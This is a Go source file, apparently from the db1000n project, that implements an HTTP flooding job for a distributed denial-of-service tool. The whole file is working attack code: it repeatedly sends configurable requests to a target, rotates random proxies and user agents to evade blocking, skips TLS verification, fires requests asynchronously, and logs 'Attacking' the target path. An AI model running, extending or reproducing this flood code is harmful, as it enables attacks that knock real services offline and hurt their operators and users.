package jobs

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

func httpJob(ctx context.Context, args Args, debug bool) error {
	defer utils.PanicHandler()

	type httpJobConfig struct {
		BasicJobConfig
		Path    string
		Method  string
		Body    json.RawMessage
		Headers map[string]string
		Client  json.RawMessage // See HTTPClientConfig
	}

	var jobConfig httpJobConfig
	if err := json.Unmarshal(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config json: %v", err)
		return err
	}

	type HTTPClientConfig struct {
		TLSClientConfig *tls.Config    `json:"tls_config,omitempty"`
		Timeout         *time.Duration `json:"timeout"`
		MaxIdleConns    *int           `json:"max_idle_connections"`
		ProxyURLs       string         `json:"proxy_urls"`
		Async           bool           `json:"async"`
	}

	var clientConfig HTTPClientConfig
	if err := json.Unmarshal([]byte(templates.Execute(string(jobConfig.Client))), &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client json: %v", err)
	}

	timeout := time.Second * 90
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	var proxy func(r *http.Request) (*url.URL, error)
	if len(clientConfig.ProxyURLs) > 0 {
		log.Printf("clientConfig.ProxyURLs: %v", clientConfig.ProxyURLs)

		var proxyURLs []string

		if err := json.Unmarshal([]byte(clientConfig.ProxyURLs), &proxyURLs); err == nil {
			if debug {
				log.Printf("proxyURLs: %v", proxyURLs)
			}

			// Return random proxy from the list
			proxy = func(r *http.Request) (*url.URL, error) {
				if len(proxyURLs) == 0 {
					return nil, errors.New("proxylist is empty")
				}

				proxyString := proxyURLs[rand.Intn(len(proxyURLs))]

				u, err := url.Parse(proxyString)
				if err != nil {
					if u, err = url.Parse(r.URL.Scheme + proxyString); err != nil && debug {
						log.Printf("Failed to parse proxy, sending request directly: %v", err)
					}
				}

				return u, nil
			}
		} else {
			if debug {
				log.Printf("Failed to parse proxies: %v", err) // It will still send traffic as if no proxies were specified, no need for warning
			}
		}
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			Dial: (&net.Dialer{
				Timeout:   timeout,
				KeepAlive: timeout,
			}).Dial,
			MaxIdleConns:          maxIdleConns,
			IdleConnTimeout:       timeout,
			TLSHandshakeTimeout:   timeout,
			ExpectContinueTimeout: timeout,
			Proxy:                 proxy,
		},
		Timeout: timeout,
	}

	trafficMonitor := metrics.Default.NewWriter(ctx, "traffic", uuid.New().String())
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for jobConfig.Next(ctx) {
		req, err := http.NewRequest(templates.Execute(jobConfig.Method), templates.Execute(jobConfig.Path),
			bytes.NewReader([]byte(templates.Execute(string(jobConfig.Body)))))
		if err != nil {
			if debug {
				log.Printf("error creating request: %v", err)
			}

			continue
		}

		select {
		case <-ticker.C:
			log.Printf("Attacking %v", jobConfig.Path)
		default:
		}

		// Add random user agent
		req.Header.Set("user-agent", uarand.GetRandom())
		for key, value := range jobConfig.Headers {
			trafficMonitor.Add(len(key))
			trafficMonitor.Add(len(value))
			req.Header.Add(templates.Execute(key), templates.Execute(value))
		}

		trafficMonitor.Add(len(jobConfig.Method))
		trafficMonitor.Add(len(jobConfig.Path))
		trafficMonitor.Add(len(jobConfig.Body))

		if debug {
			log.Printf("%s %s started at %d", jobConfig.Method, jobConfig.Path, time.Now().Unix())
		}

		sendRequest := func() {
			resp, err := client.Do(req)
			if err != nil {
				if debug {
					log.Printf("Error sending request %v: %v", req, err)
				}

				return
			}

			resp.Body.Close() // No need for response

			if debug {
				if resp.StatusCode >= http.StatusBadRequest {
					log.Printf("%s %s failed at %d with code %d", jobConfig.Method, jobConfig.Path, time.Now().Unix(), resp.StatusCode)
				} else {
					log.Printf("%s %s finished at %d", jobConfig.Method, jobConfig.Path, time.Now().Unix())
				}
			}
		}

		if clientConfig.Async {
			go sendRequest()
		} else {
			sendRequest()
		}

		time.Sleep(time.Duration(jobConfig.IntervalMs) * time.Millisecond)
	}

	return nil
}
